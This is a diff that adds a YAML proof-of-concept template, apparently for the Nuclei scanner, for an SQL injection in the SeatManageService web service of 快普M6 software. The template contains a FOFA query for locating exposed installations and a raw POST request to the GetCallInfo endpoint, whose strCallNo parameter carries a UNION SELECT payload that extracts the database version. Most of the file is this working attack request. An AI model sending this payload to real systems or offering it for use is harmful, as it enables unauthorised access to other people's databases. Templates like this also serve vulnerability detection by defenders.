@@ -1,0 +1,28 @@
+id: poc-ooru68lep46v9n6c
+info:
+  name: 快普M6 SeatManageService 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ooru68lep46v9n6c'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ooru68lep46v9n6c
+    fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
+http:
+- raw:
+  - 'POST /WebService/SeatManageService.asmx/GetCallInfo HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+
+    strCallNo=a%27+UNION+ALL+SELECT+NULL%2CNULL%2C%40%40VERSION--'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
